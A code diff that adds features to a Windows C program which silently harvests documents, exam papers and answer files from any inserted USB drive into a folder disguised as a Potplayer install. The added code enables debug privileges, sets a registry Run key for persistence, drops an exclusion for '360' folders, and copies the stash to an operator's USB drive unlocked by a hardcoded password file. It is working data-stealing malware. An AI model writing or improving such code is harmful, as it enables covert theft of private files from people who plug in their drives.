@@ -8,17 +8,23 @@
 #include <Windows.h>
 #include "dirent.h"
 int getDirName(TCHAR diskName[26][10]);
-//获取所有可移动硬盘的名称，返回可移动硬盘的个数
 int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10], int diskNumber);
 void convertsCharToTCHAR(char* strUsr, TCHAR* Name);
 void copyFile(const TCHAR* dirName);
 void findFolder(const TCHAR* dirName, BOOL recursion);
-void CreateFolder(char* folderName);
+void CreateFolder(const char* folderName);
+int findMyUDisk(TCHAR* removebleDiskName);
+char* GetFilename(char* p);
+void setComputerStart(char* argv);
+BOOL UpPrivilegeValue();
 
-int main()
+
+int main(int argc, TCHAR* argv[])
 {
+	UpPrivilegeValue();
 	while (1)
 	{
+		setComputerStart(*argv);
 		TCHAR diskName[26][10] = { 0 };
 		TCHAR removebleDiskName[26][10] = { 0 };
 		int diskNumber = 0;
@@ -31,12 +37,52 @@ int main()
 			{
 				copyFile(removebleDiskName[i]);
 				findFolder(removebleDiskName[i], FALSE);
+				findMyUDisk(removebleDiskName[i]);
 			}
 
 		}
+
+		Sleep(5000);
 	}
 	return 0;
 }
+
+BOOL UpPrivilegeValue()
+{
+	//OpenProcessToken()函数用来打开与进程相关联的访问令牌
+	HANDLE hToken = NULL;
+	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
+	{
+		return FALSE;
+	}
+	//LookupPrivilegeValue()函数查看系统权限的特权值
+	LUID luid;
+	if (FALSE == LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
+	{
+		CloseHandle(hToken);
+		return FALSE;
+	}
+	//调整权限设置
+	TOKEN_PRIVILEGES Tok;
+	Tok.PrivilegeCount = 1;
+	Tok.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	Tok.Privileges[0].Luid = luid;
+	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &Tok, sizeof(Tok), NULL, NULL))
+	{
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+	{
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	CloseHandle(hToken);
+	return TRUE;
+}
+
 
 int getDirName(TCHAR diskName[26][10])
 {
@@ -88,7 +134,7 @@ void findFolder(const TCHAR* dirName,BOOL recursion)
 		return;
 	}
 
-	if (strstr(find.name, ".") == NULL && strstr(find.name, "360") == NULL && find.attrib== _A_SUBDIR)
+	if (strstr(find.name, ".") == NULL && find.attrib== _A_SUBDIR)
 	{
 		if (recursion == 0)
 		{
@@ -109,7 +155,7 @@ void findFolder(const TCHAR* dirName,BOOL recursion)
 		{
 			fileNameAll[i] = '\0';
 		}
-		if (strstr(find.name, ".") == NULL && strstr(find.name,"360")==NULL && find.attrib == _A_SUBDIR)
+		if (strstr(find.name, ".") == NULL && find.attrib == _A_SUBDIR)
 		{
 			if (strstr(find.name, ".") == NULL)
 			{
@@ -136,7 +182,8 @@ void copyFile(const TCHAR* dirName)
 	intptr_t file;
 	struct _finddata_t find;
 
-	CreateFolder("C:\\Program Files\\Potplayer");
+	CreateFolder("D:\\Program Files");
+	CreateFolder("D:\\Program Files\\Potplayer");
 	_chdir(dirName);
 	if ((file = _findfirst("*.*", &find)) == -1L)
 	{
@@ -147,9 +194,8 @@ void copyFile(const TCHAR* dirName)
 
 	if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT("ppt")) != NULL || strstr(fileName, TEXT("doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT("txt")) != NULL)
 	{
-		printf("%s\n", fileName);
 		wsprintf(fileNameAll, TEXT("%s%s"), dirName, fileName);
-		wsprintf(copyFileName, TEXT("C:\\Program Files\\Potplayer\\%s"), fileName);
+		wsprintf(copyFileName, TEXT("D:\\Program Files\\Potplayer\\%s"), fileName);
 
 		TCHAR szCommand[1000] = { 0 };
 		sprintf(szCommand, "CMD /C Copy /V /Y \"%s\" \"%s\"", fileName, copyFileName);
@@ -169,9 +215,8 @@ void copyFile(const TCHAR* dirName)
 
 			if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL)
 			{
-				printf("%s\n", fileName);
 				wsprintf(fileNameAll, TEXT("%s%s"), dirName, fileName);
-				wsprintf(copyFileName, TEXT("C:\\Program Files\\Potplayer\\%s"), fileName);
+				wsprintf(copyFileName, TEXT("D:\\Program Files\\Potplayer\\%s"), fileName);
 				Sleep(1);
 
 				TCHAR szCommand[1000] = { 0 };
@@ -189,11 +234,82 @@ void copyFile(const TCHAR* dirName)
 	return;
 }
 
-void CreateFolder(char* folderName)
+void CreateFolder(const char* folderName)
 {
 	// 文件夹不存在则创建文件夹
 	if (_access(folderName, 0) == -1)
 	{
 		_mkdir(folderName);
 	}
+}
+
+int findMyUDisk(TCHAR *removebleDiskName)
+{
+	FILE* fp;
+	char fileName[500] = { 0 };
+	int passWord = 54188220;
+	int getword = 0;
+	wsprintf(fileName, TEXT("%s%s"), removebleDiskName,"mamsitear.txt");
+	if ((fp=fopen(fileName, "r")) == NULL)
+	{
+		return -1;
+	}
+	fscanf_s(fp, "%d", &getword);
+	if (getword == passWord)
+	{
+		TCHAR copyFloderName[100] = { 0 };
+		TCHAR szCommand[1000] = { 0 };
+		sprintf(copyFloderName, "%s%s", removebleDiskName, "Code");
+		CreateFolder(copyFloderName);
+		sprintf(szCommand, "CMD /C Xcopy /V /Y \"%s\" \"%s\"", "D:\\Program Files\\Potplayer", copyFloderName);
+		if (WinExec(szCommand, SW_HIDE) <= 31)
+		{
+			return -1;
+		}
+		return 1;
+	}
+	return 0;
+}
+
+void ComputerStart(char* pathName)
+{
+	//找到系统的启动项 
+	const char* szSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+	HKEY hKey;
+
+	//打开注册表启动项 
+	int k = RegOpenKeyExA(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey);
+	if (k == ERROR_SUCCESS)
+	{
+		//添加一个子Key,并设置值，MyStart为启动项名称，自定义设置；
+		RegSetValueEx(hKey, "MyStart", 0, REG_SZ, (BYTE*)pathName, strlen(pathName));
+		//关闭注册表
+		RegCloseKey(hKey);
+		//printf("设置成功\n");
+	}
+	else
+	{
+		//printf("设置失败  error:%d\n", k);
+	}
+}
+
+
+void setComputerStart(char* argv)
+{
+	char pathName[500] = { 0 };//文件名字最大260个字符  MAX_PATH  260
+	GetCurrentDirectory(500, pathName);//设置字符集为多字节字符集  获取当前文件路径
+
+	sprintf(pathName, "%s\\", pathName);
+	strcat(pathName, GetFilename(argv));//找到需要开机自启动的程序
+
+	ComputerStart(pathName);
+}
+
+char* GetFilename(char* p)
+{
+	int x = strlen(p);
+	char ch = '\\';
+	char* q = strrchr(p, ch) + 1;
+
+	return q;
 }
